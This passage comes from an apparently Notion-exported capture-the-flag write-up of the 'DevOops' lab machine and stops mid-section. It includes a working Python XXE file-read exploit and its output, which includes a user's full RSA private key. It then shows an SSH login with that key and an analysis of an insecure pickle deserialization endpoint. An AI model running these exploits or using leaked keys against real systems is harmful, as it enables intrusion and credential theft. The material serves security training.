+ File path: /home/roosa/deploy/src</span></span></span></code></pre><div id="https://www.notion.so/a9e58f422efd4b719ee9aa08bba7c272" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/e9f002cc91c34a8ca2270c9759c92351" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To make exploitation easier, I’ll automate the entire process in a Python script:</span></span></p></div><pre id="https://www.notion.so/a3828d348fdb4b1cac41725d3250d2a6" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">import</span> sys
+<span class="token keyword">import</span> requests
+<span class="token keyword">from</span> colorama <span class="token keyword">import</span> Fore<span class="token punctuation">,</span> Style
+
+<span class="token keyword">def</span> <span class="token function">xxe</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">{</span>ip<span class="token punctuation">}</span></span><span class="token string">:5000/upload"</span></span>
+    xml <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""&lt;?xml version="1.0" encoding="UTF-8"?>
+        &lt;!DOCTYPE lfi [&lt;!ENTITY filename SYSTEM "</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">"> ]>
+        &lt;Post>
+            &lt;Author>&amp;filename;&lt;/Author>
+            &lt;Subject>&lt;/Subject>
+            &lt;Content>&lt;/Content>
+        &lt;/Post>"""</span></span>
+    
+    files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'xxe.xml'</span><span class="token punctuation">,</span> xml<span class="token punctuation">,</span> <span class="token string">'text/xml'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string">"[-] Something went wrong."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>GREEN <span class="token operator">+</span> <span class="token string">"[+] File read successful."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+        response <span class="token operator">=</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+        response<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> response<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>response<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ConnectionError<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string">"[-] Something went wrong."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string">"[-] Usage: python xxe.py &lt;IP>"</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    
+    ip <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>BLUE <span class="token operator">+</span> <span class="token string">"[+] File to read: (enter 'exit' to quit)"</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+        path <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>BLUE <span class="token operator">+</span> <span class="token string">">> "</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>path <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string">"[-] Bye!"</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+        xxe<span class="token punctuation">(</span>path<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/5c8b7a6d08bf48ef9bca28a5660f8cf4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The script runs on a loop, and I can easily read any file that I have permission to.</span></span></p></div><pre id="https://www.notion.so/7142b8c91c78458e8b86450942075848" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/devoops]
+└─$</span></mark></span><span class="SemanticString"><span> python xxe.py 10.129.191.193
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[+] File to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> /etc/hosts
+
+[+] File read successful.
+127.0.0.1	localhost
+127.0.1.1	devoops
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[+] File to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> /etc/shadow
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>[-] Something went wrong.
+</span></mark></span><span class="SemanticString"><span>
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[+] File to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span></span></code></pre><div id="https://www.notion.so/0aa45214945946519eff4a8cc0b2608e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/29f13eb31f734127b5bce86ca99d228c" class="Divider"></div><h3 id="https://www.notion.so/13876a809fb94285a0d30ec706ae1fa4" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/13876a809fb94285a0d30ec706ae1fa4"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Foothold:</span></span></h3><div id="https://www.notion.so/2ba66279070a482a87e5f6755c9dc5a9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Easy Way — SSH Key:</strong></span></span></p></div><div id="https://www.notion.so/1529c770e8604a2b884244415f8d2dfb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">From the page response earlier, we already know a username, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">roosa</code></span><span class="SemanticString">, and a private key can be found in the user’s </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.ssh</code></span><span class="SemanticString"> directory:</span></span></p></div><pre id="https://www.notion.so/2db6d49041f4499eb5c826340c4d4b20" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[+] File to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> /home/roosa/.ssh/id_rsa
+
+[+] File read successful.
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
+9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
+R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
+v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
+9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
+m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
+JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
+ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
+lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
+koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
+e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
+8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
+Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
+NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
+hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
+ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
+A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
+agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
+KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
+vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
+8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
+y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
+aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
+xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
+82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
+-----END RSA PRIVATE KEY-----</span></span></span></code></pre><div id="https://www.notion.so/2e281e0ac38741a481cede86b0c012fa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This was the mistake the creator made, accidentally leaving the private key on the box. I can simply use the key to SSH in.</span></span></p></div><pre id="https://www.notion.so/93597a3c4a534a8fa854a3e9b502a534" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/devoops]
+└─$</span></mark></span><span class="SemanticString"><span> chmod 600 roosa.key
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/devoops]
+└─$</span></mark></span><span class="SemanticString"><span> ssh roosa@10.129.191.193 -i roosa.key
+
+Warning: Permanently added &#x27;10.129.191.193&#x27; (ED25519) to the list of known hosts.
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+135 packages can be updated.
+60 updates are security updates.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>roosa@devoops:~$</span></mark></span><span class="SemanticString"><span> id
+
+uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)</span></span></span></code></pre><div id="https://www.notion.so/81ab535077844c62ae4301176bef4632" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/7ebfed45752445a4b6a9c497c98a08e8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Intended Path — Source Code Analysis:</strong></span></span></p></div><div id="https://www.notion.so/de5ced793bc84a3da027d9f98acd1358" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The intended path is not as simple, however. I’ll keep enumerating, pretending that the private key wasn’t there. I’ll grab the source code of the app, which was hinted to me in the server responses earlier.</span></span></p></div><pre id="https://www.notion.so/eebf1d16e1694eb28ce2e52e2a16004e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>[+] File to read: (enter &#x27;exit&#x27; to quit)
+&gt;&gt;</span></mark></span><span class="SemanticString"><span> /home/roosa/deploy/src/feed.py
+
+[+] File read successful.
+&#x27;)
+def uploaded_file(filename):
+    return send_from_directory(Config.UPLOAD_FOLDER,
+                               filename)
+
+@app.route(&quot;/&quot;)
+def xss():
+    return template(&#x27;index.html&#x27;)
+
+@app.route(&quot;/feed&quot;)
+def fakefeed():
+   return send_from_directory(&quot;.&quot;,&quot;devsolita-snapshot.png&quot;)
+
+@app.route(&quot;/newpost&quot;, methods=[&quot;POST&quot;])
+def newpost():
+  # TODO: proper save to database, this is for testing purposes right now
+  picklestr = base64.urlsafe_b64decode(request.data)
+#  return picklestr
+  postObj = pickle.loads(picklestr)
+  return &quot;POST RECEIVED: &quot; + postObj[&#x27;Subject&#x27;]
+
+
+## TODO: VERY important! DISABLED THIS IN PRODUCTION
+#app = DebuggedApplication(app, evalex=True, console_path=&#x27;/debugconsole&#x27;)
+# TODO: Replace run-gunicorn.sh with real Linux service script
+# app = DebuggedApplication(app, evalex=True, console_path=&#x27;/debugconsole&#x27;)
+
+if __name__ == &quot;__main__&quot;:
+  app.run(host=&#x27;0.0.0,0&#x27;, Debug=True)</span></span></span></code></pre><div id="https://www.notion.so/c993f99f01f748afb2fe042ae4b0e6d3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The script starts with “</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&#x27;)</code></span><span class="SemanticString">&quot;, which seems pretty broken to me. Regardless, it still showed several endpoints of the app. As I guessed correctly, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/newpost</code></span><span class="SemanticString"> is only expecting POST requests, explaining the 405 status detected by </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gobuster</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/984235b01ed74247a3442489c9caf996" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2ca8f0846ef849e59532a322c0bee036" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Insecure Pickle Deserialization:</strong></span></span></p></div><div id="https://www.notion.so/6b4416b9d8b04259a4bf15580b9f148e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I noticed it’s deserializing strings using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">pickle.loads()</code></span><span class="SemanticString">. Pickle is a Python module for serializing and deserializing Python objects, and it’s well-known to be insecure. Basically when Pickle deserializes an object (i.e., </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">pickle.loads()</code></span><span class="SemanticString">), it runs the object’s </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">__reduce__</code></span><span class="SemanticString"> method, which essentially defines how the object should be deserialized, or “unpickled”.</span></span></p></div><div id="https://www.notion.so/1090f70474494f38ae8a24f1de0e56da" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The vulnerability emerges when attackers are able to pass any objects for “unpickling”, in which case they can create a malicious object with a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">__reduce__</code></span><span class="SemanticString"> method calling other dangerous Python functions, such as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">eval()</code></span><span class="SemanticString"> or </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">os.system()</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/f94779a0565d4bcf8d44ed6fb6de378c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/">This post</a></span><span class="SemanticString"> provides a nice example of exploiting Pickle, but there’s many others. Just by Googling “</span><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Pickle deserialization exploits</em></span><span class="SemanticString">”, you’ll find a dozen more similar posts. Even Pickle’s </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://docs.python.org/3/library/pickle.html">official documentation</a></span><span class="SemanticString"> has a large banner warning that it’s insecure.</span></span></p></div><div id="https://www.notion.so/86cc29fd669d446c8882492886e0367b" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe163b999-b84f-4de7-8e47-c449c2df94b9%2FUntitled.png?width=939&amp;table=block&amp;id=86cc29fd-669d-446c-8882-492886e0367b"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe163b999-b84f-4de7-8e47-c449c2df94b9%2FUntitled.png?width=939&amp;table=block&amp;id=86cc29fd-669d-446c-8882-492886e0367b" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/c9db53ced80345b2ad52350997135dfd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In short, whenever you see Pickle deserializing user input directly, it’s almost guaranteed code execution.</span></span></p></div><div id="https://www.notion.so/37a0cfc8fc9542afa4c8ef0a83b15980" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/b0d48a0beb4f4a84865274c145661673" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">But before exploiting this, I’ll first work out the intended functionality of the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/newpost</code></span><span class="SemanticString"> endpoint.</span></span></p></div><pre id="https://www.notion.so/d49c7413d0b64c7f873ffb5d37612020" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/newpost"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">newpost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token comment"># TODO: proper save to database, this is for testing purposes right now</span>
+  picklestr <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64decode<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
+<span class="token comment">#  return picklestr</span>
+  postObj <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>picklestr<span class="token punctuation">)</span>
+  <span class="token keyword">return</span> <span class="token string">"POST RECEIVED: "</span> <span class="token operator">+</span> postObj<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span></span></span></span></code></pre><div id="https://www.notion.so/1ff1f8991f9f41319fd8621dc6b03a8b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The app is URLsafe-base64 decoding the POST data, unpickling it into a dictionary and send the value of “Subject” as the response. For example, if I POST this pickle-serialized dictionary </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">{&#x27;Subject&#x27;: &#x27;ch3ng&#x27;}</code></span><span class="SemanticString">, the server should respond with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">POST RECEIVED: ch3ng</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/ad1e5ba243754e1ab60b9f1b28e41a89" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> base64
+
+data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Subject'</span><span class="token punctuation">:</span> <span class="token string">'ch3ng'</span><span class="token punctuation">}</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/4d342be008b3417880ce975bf9cfdebb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll use a simple Python script to generate the serialized payload.</span></span></p></div><pre id="https://www.notion.so/507d3ff0029947e596f305f96a2919ce" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/devoops]
+└─$</span></mark></span><span class="SemanticString"><span> python2 payload.py
+
+KGRwMApTJ1N1YmplY3QnCnAxClMnY2gzbmcnCnAyCnMu</span></span></span></code></pre><div id="https://www.notion.so/84716854d5a044aeaf86022e49adcdf0" class="ColorfulBlock ColorfulBlock--BgGray Callout"><div class="Callout__Icon"><div class="Icon">💡</div></div><p class="Callout__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Important:</strong></span><span class="SemanticString"> Since the box is running an old Python version, Python2 must be used to generate a correct payload.</span></span></p></div><div id="https://www.notion.so/e2c242e1eac7402e8f5560bea7772514" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I’ll send the data to the server with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString">, and it responded with the exactly what I’m expecting:</span></span></p></div><pre id="https://www.notion.so/6b4f5c0044f74d189b728e0184389f3c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/devoops]
+└─$</span></mark></span><span class="SemanticString"><span> curl http://10.129.191.193:5000/newpost -X POST -H &#x27;Content-Type:&#x27; -d &#x27;KGRwMApTJ1N1YmplY3QnCnAxClMnY2gzbmcnCnAyCnMu&#x27;     
+
+POST RECEIVED: ch3ng</span></span></span></code></pre><div id="https://www.notion.so/0141e4149c7d4f0fa783a1901183f691" class="ColorfulBlock ColorfulBlock--BgGray Callout"><div class="Callout__Icon"><div class="Icon">💡</div></div><p class="Callout__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Note:</strong></span><span class="SemanticString"> The </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Content-Type</code></span><span class="SemanticString"> header must be explicitly set as blank, otherwise </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString"> automatically defaults it as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">application/xml</code></span><span class="SemanticString">, which messes up the request and results in 500 Internal Server Error.</span></span></p></div><div id="https://www.notion.so/138692ff3ef942bcb8414514a70f1f05" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/22430f2c126d41fe82cfa64435b29bc2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Crafting the Payload:</strong></span></span></p></div><div id="https://www.notion.so/09c0ef0b099549548673d08683b1f209" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span 